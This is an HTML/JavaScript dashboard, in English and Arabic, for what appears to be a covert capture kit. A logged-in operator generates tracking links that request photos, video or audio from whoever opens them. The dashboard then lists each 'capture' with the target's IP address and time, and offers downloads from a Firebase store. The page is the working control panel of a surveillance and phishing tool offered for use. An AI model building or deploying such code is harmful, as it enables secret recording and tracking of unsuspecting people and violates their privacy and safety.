<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>⛧ KURABI_USER ⛧</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0d1225 100%);
            font-family: 'Courier New', monospace;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
            border-bottom: 2px solid #00ff41;
            padding-bottom: 15px;
            margin-bottom: 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        .title { color: #00ff41; font-size: 1.5rem; text-shadow: 0 0 10px #00ff41; }
        .title span { color: #ff0040; }
        .header-right { display: flex; gap: 15px; align-items: center; }
        .access-badge { color: #00ff41; border: 1px solid #00ff41; padding: 5px 15px; border-radius: 25px; font-size: 0.75rem; }
        .lang-btn { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 5px 15px; border-radius: 25px; cursor: pointer; font-family: monospace; font-size: 0.75rem; }
        .lang-btn.active { background: #00ff41; color: #000; }
        .logout-btn { background: #ff0040; border: none; color: #fff; padding: 5px 15px; border-radius: 25px; cursor: pointer; }
        .stats-grid { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 25px; }
        .stat-card { background: rgba(10,10,10,0.9); border: 1px solid #00ff41; border-radius: 12px; padding: 20px; flex: 1; text-align: center; }
        .stat-card h4 { color: #00ff41; font-size: 0.7rem; margin-bottom: 8px; }
        .stat-card .value { color: #ff0040; font-size: 2rem; font-weight: bold; }
        .panel { background: rgba(10,10,10,0.95); border: 1px solid #00ff41; border-radius: 16px; padding: 25px; margin-bottom: 25px; }
        .panel h3 { color: #00ff41; margin-bottom: 20px; border-left: 3px solid #00ff41; padding-left: 15px; }
        body.rtl .panel h3 { border-left: none; border-right: 3px solid #00ff41; padding-left: 0; padding-right: 15px; }
        .duration-slider { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; background: #050505; padding: 12px; border-radius: 12px; }
        .duration-slider label { color: #00ff41; }
        .duration-slider input { flex: 1; max-width: 300px; background: #1f1f1f; height: 4px; -webkit-appearance: none; }
        .duration-slider input::-webkit-slider-thumb { width: 16px; height: 16px; border-radius: 50%; background: #00ff41; cursor: pointer; }
        .duration-value { color: #ff0040; font-weight: bold; background: #000; padding: 4px 12px; border-radius: 20px; }
        .link-buttons { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 20px; }
        .gen-link { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; cursor: pointer; border-radius: 40px; font-family: monospace; transition: 0.2s; font-weight: bold; }
        .gen-link:hover { background: #00ff41; color: #000; transform: translateY(-2px); }
        .gen-link-fast { border-color: #ffaa00; color: #ffaa00; }
        .output-box { background: #050505; border: 1px dashed #00ff41; border-radius: 12px; padding: 15px; font-size: 0.75rem; word-break: break-all; margin-top: 15px; }
        .copy-btn { background: #00ff41; border: none; padding: 4px 12px; border-radius: 15px; cursor: pointer; font-weight: bold; margin-left: 10px; }
        .btn-group { display: flex; gap: 12px; margin-bottom: 25px; flex-wrap: wrap; }
        .btn { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; cursor: pointer; border-radius: 40px; }
        .btn:hover { background: #00ff41; color: #000; }
        .btn-danger { border-color: #ff0040; color: #ff0040; }
        .card { background: #050505; border: 1px solid #00ff41; border-radius: 12px; margin-bottom: 20px; overflow: hidden; }
        .card-header { background: #0a0a0a; padding: 12px 18px; border-bottom: 1px solid #00ff41; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
        .card-header .ip { color: #00ff41; font-size: 0.8rem; font-weight: bold; }
        .card-header .time { color: #888; font-size: 0.7rem; }
        .media-strip { display: flex; overflow-x: auto; gap: 12px; padding: 18px; }
        .media-strip img, .media-strip video { width: 140px; height: 140px; object-fit: cover; border: 2px solid #00ff41; border-radius: 10px; cursor: pointer; }
        .card-footer { padding: 12px 18px; border-top: 1px solid #00ff4133; display: flex; justify-content: flex-end; gap: 10px; }
        .download-btn { background: #00ff41; color: #000; border: none; padding: 6px 16px; border-radius: 20px; cursor: pointer; font-weight: bold; }
        .delete-single { background: #ff0040; color: #fff; border: none; padding: 6px 16px; border-radius: 20px; cursor: pointer; }
        .loading { text-align: center; color: #00ff41; padding: 50px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; justify-content: center; align-items: center; cursor: pointer; }
        .modal img, .modal video { max-width: 95%; max-height: 95%; border: 3px solid #00ff41; border-radius: 16px; }
        .modal-close { position: absolute; top: 25px; right: 35px; color: #00ff41; font-size: 40px; cursor: pointer; }
        @media (max-width: 768px) { .media-strip img, .media-strip video { width: 100px; height: 100px; } .gen-link { padding: 8px 16px; font-size: 0.7rem; } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="title">⛧ <span>KURABI</span>_USER ⛧</div>
        <div class="header-right">
            <div class="access-badge" id="accessText">ACCESS: GRANTED</div>
            <button class="lang-btn" id="langBtn">🇸🇦 العربية</button>
            <button class="logout-btn" id="logoutBtn">⛧ LOGOUT</button>
        </div>
    </div>
    
    <div class="stats-grid">
        <div class="stat-card"><h4 id="myCapturesLabel">MY CAPTURES</h4><div class="value" id="captureCount">0</div></div>
        <div class="stat-card"><h4 id="totalMediaLabel">TOTAL MEDIA</h4><div class="value" id="mediaCount">0</div></div>
    </div>
    
    <div class="panel">
        <h3 id="generateLabel">⟳ GENERATE LINK</h3>
        <div class="duration-slider">
            <label id="durationLabel">🎬 VIDEO DURATION:</label>
            <input type="range" id="videoDuration" min="1" max="60" value="6">
            <span class="duration-value" id="durationValue">6 sec</span>
        </div>
        <div class="link-buttons">
            <button class="gen-link" id="genPhotoBtn">📸 PHOTO (1)</button>
            <button class="gen-link" id="gen5PhotoBtn">📸 5 PHOTOS</button>
            <button class="gen-link" id="genVideoOnlyBtn">🎬 VIDEO (NO AUDIO)</button>
            <button class="gen-link" id="genAudioBtn">🎤 AUDIO ONLY</button>
            <button class="gen-link gen-link-fast" id="genVideoAudioBtn">🎬🎤 VIDEO+AUDIO</button>
        </div>
        <div class="output-box" id="linkOutput"></div>
    </div>
    
    <div class="btn-group">
        <button class="btn" id="refreshBtn">⟳ REFRESH</button>
        <button class="btn btn-danger" id="clearAllBtn">⛧ CLEAR ALL</button>
    </div>
    
    <div id="list"></div>
</div>

<div id="modal" class="modal"><span class="modal-close">✕</span><div id="modalContent"></div></div>

<script src="config.js"></script>

<script type="importmap">
    {
        "imports": {
            "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
            "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js",
            "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
        }
    }
</script>

<script type="module">
    import { initializeApp } from "firebase/app";
    import { getAuth, onAuthStateChanged, signOut } from "firebase/auth";
    import { getFirestore, collection, query, where, getDocs, deleteDoc, doc } from "firebase/firestore";

    const firebaseConfig = window.FIREBASE_CONFIG;
    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getFirestore(app);
    
    const BASE_URL = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '');

    const translations = {
        en: {
            accessText: "ACCESS: GRANTED", myCaptures: "MY CAPTURES", totalMedia: "TOTAL MEDIA",
            generateLink: "⟳ GENERATE LINK", durationLabel: "🎬 VIDEO DURATION:",
            photo1: "📸 PHOTO (1)", photo5: "📸 5 PHOTOS", videoOnly: "🎬 VIDEO (NO AUDIO)",
            audioOnly: "🎤 AUDIO ONLY", videoAudio: "🎬🎤 VIDEO+AUDIO", refresh: "⟳ REFRESH",
            clearAll: "⛧ CLEAR ALL", logout: "⛧ LOGOUT", copy: "COPY", linkLabel: "🔗 LINK:",
            delete: "DELETE", downloadAll: "⬇ DOWNLOAD ALL", noData: "[ NO DATA ]",
            loading: "⟳ LOADING...", confirmDelete: "⛧ Delete this capture?",
            confirmClearAll: "⛧ Delete ALL your captures?", sec: "sec",
            photo: "PHOTO", photos: "PHOTOS", video: "VIDEO", audio: "AUDIO", videoAudioMode: "VIDEO+AUDIO"
        },
        ar: {
            accessText: "الوصول: ممنوح", myCaptures: "التقاطاتي", totalMedia: "إجمالي الوسائط",
            generateLink: "⟳ إنشاء رابط", durationLabel: "🎬 مدة الفيديو:",
            photo1: "📸 صورة (1)", photo5: "📸 5 صور", videoOnly: "🎬 فيديو (بدون صوت)",
            audioOnly: "🎤 صوت فقط", videoAudio: "🎬🎤 فيديو+صوت", refresh: "⟳ تحديث",
            clearAll: "⛧ مسح الكل", logout: "⛧ تسجيل الخروج", copy: "نسخ", linkLabel: "🔗 الرابط:",
            delete: "حذف", downloadAll: "⬇ تحميل الكل", noData: "[ لا توجد بيانات ]",
            loading: "⟳ جاري التحميل...", confirmDelete: "⛧ حذف هذا العنصر؟",
            confirmClearAll: "⛧ حذف جميع العناصر؟", sec: "ثانية",
            photo: "صورة", photos: "صور", video: "فيديو", audio: "صوت", videoAudioMode: "فيديو+صوت"
        }
    };

    let currentLang = localStorage.getItem('app_language') || 'en';
    let currentUser = null;

    function t(key) { return translations[currentLang][key] || translations.en[key]; }

    function applyLanguage() {
        document.getElementById('accessText').innerText = t('accessText');
        document.getElementById('myCapturesLabel').innerText = t('myCaptures');
        document.getElementById('totalMediaLabel').innerText = t('totalMedia');
        document.getElementById('generateLabel').innerHTML = t('generateLink');
        document.getElementById('durationLabel').innerHTML = t('durationLabel');
        document.getElementById('genPhotoBtn').innerHTML = t('photo1');
        document.getElementById('gen5PhotoBtn').innerHTML = t('photo5');
        document.getElementById('genVideoOnlyBtn').innerHTML = t('videoOnly');
        document.getElementById('genAudioBtn').innerHTML = t('audioOnly');
        document.getElementById('genVideoAudioBtn').innerHTML = t('videoAudio');
        document.getElementById('refreshBtn').innerHTML = t('refresh');
        document.getElementById('clearAllBtn').innerHTML = t('clearAll');
        document.getElementById('logoutBtn').innerHTML = t('logout');
        document.getElementById('langBtn').innerHTML = currentLang === 'en' ? '🇸🇦 العربية' : '🇬🇧 English';
        
        const val = document.getElementById('videoDuration').value;
        document.getElementById('durationValue').innerText = val + ' ' + t('sec');
        
        if (currentLang === 'ar') {
            document.body.classList.add('rtl');
            document.documentElement.dir = 'rtl';
        } else {
            document.body.classList.remove('rtl');
            document.documentElement.dir = 'ltr';
        }
    }

    function setLanguage(lang) {
        currentLang = lang;
        localStorage.setItem('app_language', lang);
        applyLanguage();
        loadMyData();
    }

    document.getElementById('videoDuration').addEventListener('input', function() {
        document.getElementById('durationValue').innerText = this.value + ' ' + t('sec');
    });

    async function loadMyData() {
        if (!currentUser) return;
        const listDiv = document.getElementById('list');
        listDiv.innerHTML = `<div class="loading">${t('loading')}</div>`;
        
        try {
            console.log("🔍 Loading data for user:", currentUser.uid);
            const q = query(collection(db, "captures"), where("userId", "==", currentUser.uid));
            const snapshot = await getDocs(q);
            
            let myData = [];
            let totalMedia = 0;
            snapshot.forEach(docSnap => {
                const data = docSnap.data();
                myData.push({ id: docSnap.id, ...data });
                totalMedia += (data.media?.length || 0);
            });
            myData.sort((a, b) => (b.unix || 0) - (a.unix || 0));
            
            console.log("📊 Found", myData.length, "captures");
            
            document.getElementById('captureCount').innerText = myData.length;
            document.getElementById('mediaCount').innerText = totalMedia;
            
            if (myData.length === 0) {
                listDiv.innerHTML = `<div class="loading">${t('noData')}</div>`;
                return;
            }
            
            let html = '';
            for (let item of myData) {
                const date = new Date(item.timestamp);
                const media = item.media || [];
                let modeText = '';
                switch(item.mode) {
                    case 'photo': modeText = t('photo'); break;
                    case '5photos': modeText = t('photos'); break;
                    case 'videoonly': modeText = t('video'); break;
                    case 'audio': modeText = t('audio'); break;
                    case 'videoaudio': modeText = t('videoAudioMode'); break;
                    default: modeText = item.mode;
                }
                let mediaHtml = '';
                for (let m of media) {
                    const isVideo = m.match(/\.(mp4|webm|mov)/i);
                    if (isVideo) {
                        mediaHtml += `<video src="${m}" onclick="showMedia('${m}', true)"></video>`;
                    } else {
                        mediaHtml += `<img src="${m}" onclick="showMedia('${m}', false)">`;
                    }
                }
                html += `
                    <div class="card">
                        <div class="card-header">
                            <div class="ip">🌐 IP: ${item.ip || 'unknown'}</div>
                            <div class="time">⛧ ${date.toLocaleString()} | ${modeText} ${item.duration ? '('+item.duration+' '+t('sec')+')' : ''}</div>
                        </div>
                        <div class="media-strip">${mediaHtml}</div>
                        <div class="card-footer">
                            <button class="download-btn" onclick="downloadAllMedia(${JSON.stringify(media).replace(/"/g, '&quot;')})">${t('downloadAll')}</button>
                            <button class="delete-single" onclick="deleteCapture('${item.id}')">🗑 ${t('delete')}</button>
                        </div>
                    </div>
                `;
            }
            listDiv.innerHTML = html;
        } catch(err) {
            console.error("❌ Error loading data:", err);
            listDiv.innerHTML = `<div class="loading">❌ ${err.message}</div>`;
        }
    }
    
    window.downloadAllMedia = async (mediaUrls) => {
        for (let url of mediaUrls) {
            const a = document.createElement('a');
            a.href = url;
            a.download = url.split('/').pop().split('?')[0] || 'media';
            a.target = '_blank';
            a.click();
            await new Promise(r => setTimeout(r, 300));
        }
    };
    
    window.showMedia = (url, isVideo) => {
        const modal = document.getElementById('modal');
        const modalContent = document.getElementById('modalContent');
        if (isVideo) {
            modalContent.innerHTML = `<video src="${url}" controls autoplay style="max-width:95%; max-height:95%;"></video>`;
        } else {
            modalContent.innerHTML = `<img src="${url}" style="max-width:95%; max-height:95%;">`;
        }
        modal.style.display = 'flex';
    };
    
    window.deleteCapture = async (id) => {
        if (!confirm(t('confirmDelete'))) return;
        try {
            await deleteDoc(doc(db, "captures", id));
            await loadMyData();
        } catch(err) { alert('❌ ' + err.message); }
    };
    
    async function clearAll() {
        if (!confirm(t('confirmClearAll'))) return;
        const q = query(collection(db, "captures"), where("userId", "==", currentUser.uid));
        const snapshot = await getDocs(q);
        for (const docSnap of snapshot.docs) {
            await deleteDoc(doc(db, "captures", docSnap.id));
        }
        await loadMyData();
    }
    
    function generateLink(mode) {
        if (!currentUser) return;
        let url = `${BASE_URL}/?mode=${mode}&uid=${currentUser.uid}`;
        if (mode === 'videoonly' || mode === 'videoaudio' || mode === 'audio') {
            url += `&duration=${document.getElementById('videoDuration').value}`;
        }
        document.getElementById('linkOutput').innerHTML = `${t('linkLabel')} <a href="${url}" target="_blank" style="color:#00ff41">${url}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${url}')">${t('copy')}</button>`;
    }
    
    document.getElementById('genPhotoBtn').onclick = () => generateLink('photo');
    document.getElementById('gen5PhotoBtn').onclick = () => generateLink('5photos');
    document.getElementById('genVideoOnlyBtn').onclick = () => generateLink('videoonly');
    document.getElementById('genAudioBtn').onclick = () => generateLink('audio');
    document.getElementById('genVideoAudioBtn').onclick = () => generateLink('videoaudio');
    document.getElementById('refreshBtn').onclick = loadMyData;
    document.getElementById('clearAllBtn').onclick = clearAll;
    document.getElementById('logoutBtn').onclick = async () => { await signOut(auth); window.location.href = 'login.html'; };
    document.getElementById('langBtn').onclick = () => setLanguage(currentLang === 'en' ? 'ar' : 'en');
    
    const modal = document.getElementById('modal');
    modal.onclick = (e) => { if (e.target === modal || e.target.classList.contains('modal-close')) { modal.style.display = 'none'; document.getElementById('modalContent').innerHTML = ''; } };
    
    onAuthStateChanged(auth, (user) => {
        if (user) {
            currentUser = user;
            console.log("✅ User logged in:", user.uid, user.email);
            applyLanguage();
            loadMyData();
        } else {
            window.location.href = 'login.html';
        }
    });
</script>
</body>
</html>
